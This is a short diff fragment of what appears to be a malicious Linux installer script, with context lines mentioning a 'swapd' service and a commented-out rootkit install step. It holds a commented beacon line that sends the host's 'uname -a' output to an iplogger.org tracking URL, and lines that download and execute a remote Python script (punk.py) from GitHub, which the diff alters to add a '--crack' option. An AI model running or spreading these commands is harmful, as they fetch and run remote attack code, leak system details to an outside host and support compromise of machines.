@@ -471,8 +471,8 @@ systemctl status swapd
 
 #$(curl -s -k https://iplogger.org/133yw7 --user-agent "Mozilla 5.0" --referer "$(uname -a)" -o /dev/null || wget -q -O /dev/null --user-agent="Mozilla 5.0" https://iplogger.org/133yw7 --no-check-certificate --referer="$(uname -a)")
 
-python -c "import urllib2;exec(urllib2.urlopen('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').read())" --no-passwd
-python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)"
+python -c "import urllib2;exec(urllib2.urlopen('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').read())" --no-passwd --crack
+python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)" --crack
 
 
 #echo "[*] Installing r00tkit"
